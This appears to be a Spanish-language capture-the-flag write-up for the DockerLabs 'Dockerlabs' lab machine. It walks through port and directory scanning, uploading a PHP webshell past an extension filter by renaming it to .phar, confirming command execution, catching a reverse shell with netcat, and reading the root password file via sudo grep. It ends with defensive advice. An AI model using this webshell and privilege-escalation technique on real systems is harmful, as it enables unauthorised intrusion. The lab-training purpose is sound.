# DockerLabs — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 17/07/2024  
**Técnicas:** Nmap · Gobuster · File Upload bypass (.phar) · Reverse Shell · cut+grep/sudo · GTFObins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — formulario de subida](#2-enumeración-web--formulario-de-subida)
3. [Bypass de extensión — .phar en lugar de .php](#3-bypass-de-extensión--phar-en-lugar-de-php)
4. [Reverse Shell](#4-reverse-shell)
5. [Escalada de privilegios — cut y grep con sudo](#5-escalada-de-privilegios--cut-y-grep-con-sudo)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh dockerlabs.tar
```

> IP asignada: `172.17.0.2`.

Escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
cat Puertos
```

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
| http-title: Dockerlabs
```

Solo puerto 80.

---

## 2. Enumeración web — formulario de subida

La web tiene título "Dockerlabs". Lanzamos Gobuster en paralelo mientras exploramos:

```bash
sudo gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x py,txt,php,html -t 100 -k -r
```

```
/uploads      (Status: 200) [Size: 741]
/upload.php   (Status: 200) [Size: 0]
/index.php    (Status: 200) [Size: 8235]
/machine.php  (Status: 200) [Size: 1361]
```

Visitamos `http://172.17.0.2/upload.php` — formulario para subir archivos. Intentamos subir directamente una webshell PHP:

```bash
nano shell.php
```

```php
<?php
system($_GET['cmd']);
?>
```

Al intentar subirlo, la aplicación rechaza:

```
No se permite la subida de archivos que no sean .zip
```

---

## 3. Bypass de extensión — .phar en lugar de .php

`.phar` es el formato de archivo PHP equivalente a un ZIP — PHP lo ejecuta igual que `.php` pero algunos filtros no lo bloquean:

```bash
mv shell.php shell.phar
```

Subimos `shell.phar` y el servidor lo acepta:

```
El archivo shell.phar ha sido subido correctamente.
```

Verificamos en `/uploads/` y confirmamos RCE:

```
http://172.17.0.2/uploads/shell.phar?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

✅ RCE confirmada.

---

## 4. Reverse Shell

```bash
sudo nc -lvnp 443
```

Payload desde revshells.com (Bash, IP 192.168.1.26, puerto 443), URL-encodeado en el parámetro `cmd`. Recibimos conexión:

```bash
www-data@14e4d6e9447b:/var/www/html/uploads$
```

---

## 5. Escalada de privilegios — cut y grep con sudo

```bash
www-data@14e4d6e9447b:/var/www/html/uploads$ sudo -l
```

```
User www-data may run the following commands on 14e4d6e9447b:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```

Exploramos el sistema. En `/opt/` encontramos una nota:

```bash
www-data@14e4d6e9447b:/var/www/html/uploads$ cd /opt/
www-data@14e4d6e9447b:/opt$ cat nota.txt
Protege la clave de root, se encuentra en su directorio /root/clave.txt,
menos mal que nadie tiene permisos para acceder a ella.
```

Usamos `grep` con sudo para leer ese fichero (GTFObins):

```bash
www-data@14e4d6e9447b:/opt$ LFILE=/root/clave.txt
www-data@14e4d6e9447b:/opt$ sudo grep '' $LFILE
dockerlabsmolamogollon123
```

Contraseña de root: **dockerlabsmolamogollon123**

```bash
www-data@14e4d6e9447b:/opt$ su root
Password: dockerlabsmolamogollon123
root@14e4d6e9447b:/opt# whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Filtro de extensión bypasseable con .phar** | `upload.php` | Upload de webshell PHP |
| **Nota con ubicación de contraseña en /opt** | `/opt/nota.txt` | Revela dónde buscar |
| **grep con sudo** | `/usr/bin/grep` | Lectura de /root/clave.txt |

**Para defenderse:**
- Validar tipo MIME real del archivo en el servidor, no solo la extensión. `.phar`, `.php5`, `.phtml` son variantes que ejecutan PHP.
- Los ficheros de notas con información sensible en directorios accesibles son vectores de información.
- `grep` y `cut` con sudo permiten leer cualquier fichero del sistema. Auditar todos los sudoers con `sudo -l` por usuario.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
